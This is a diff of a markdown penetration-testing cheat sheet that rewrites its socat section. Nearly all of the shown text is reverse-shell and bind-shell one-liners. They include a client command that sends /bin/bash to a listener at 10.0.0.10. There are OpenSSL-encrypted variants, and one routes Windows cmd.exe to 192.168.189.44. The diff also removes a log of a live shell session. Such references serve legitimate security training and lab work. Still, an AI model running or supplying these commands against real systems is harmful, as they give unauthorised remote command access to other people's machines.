@@ -201,27 +201,19 @@ Hellothere!
 Summer2022!
 ```
 
-#### Reverse Shell
+#### Reverse shell
 
-**Listener:**
+**Server:**
 
 * `-d -d` - option increases verbosity
 * `TCP4-LISTEN:443` - creates the IPv4 listener on port 443
 * `STDOUT` - connects to the standard output
 
 ```plain
-$ socat -d -d TCP4-LISTEN:443 STDOUT 
-... socat[4388] N listening on AF=2 0.0.0.0:443
-... socat[4388] N accepting connection from AF=2 10.0.0.11:54720 on 10.0.0.10:443
-... socat[4388] N using stdout for reading and writing
-... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
-whoami
-kali
-id
-uid=1000(kali) gid=1000(kali) groups=1000(kali)
+socat -d -d TCP4-LISTEN:443 STDOUT 
 ```
 
-**Target host:**
+**Client:**
 
 * `EXEC:/bin/bash` - states when the connection is established it will allow access to `/bin/bash`
 
@@ -229,11 +221,25 @@ uid=1000(kali) gid=1000(kali) groups=1000(kali)
 socat TCP4:10.0.0.10:443 EXEC:/bin/bash
 ```
 
-#### Encrypted (bind/reverse) shell
+#### Bind shell
+
+**Server:**
+
+In this case a Windows machine.
+
+```plain
+socat -d -d TCP4-LISTEN:443 EXEC:'cmd.exe',pipes
+```
+
+**Client:**
+
+```plain
+socat - TCP4:<IP-of-SERVER>:443
+```
+
+#### Encrypted bind shell
 
 To create a certificate, please check [OpenSSL]({{< ref "openssl" >}}).
-
-##### Bind shell
 
 **Server:**
 
@@ -245,6 +251,24 @@ sudo socat OPENSSL-LISTEN:443,cert=yourcert.pem,verify=0,fork EXEC:/bin/bash
 
 ```plain
 socat - OPENSSL:10.11.0.4:443,verify=0
+```
+
+#### Encrypted reverse shell
+
+**Server:**
+
+Listening for incoming reverse shell serving the certificate created with [OpenSSL]({{< ref "openssl" >}}).
+
+```plain
+sudo socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0
+```
+
+**Client:**
+
+Windows machine starting the connection to server routing `cmd.exe` in the shell.
+
+```plain
+socat -d -d OPENSSL:192.168.189.44:443,verify=0 EXEC:'cmd.exe',pipes
 ```
 
 ### URL list
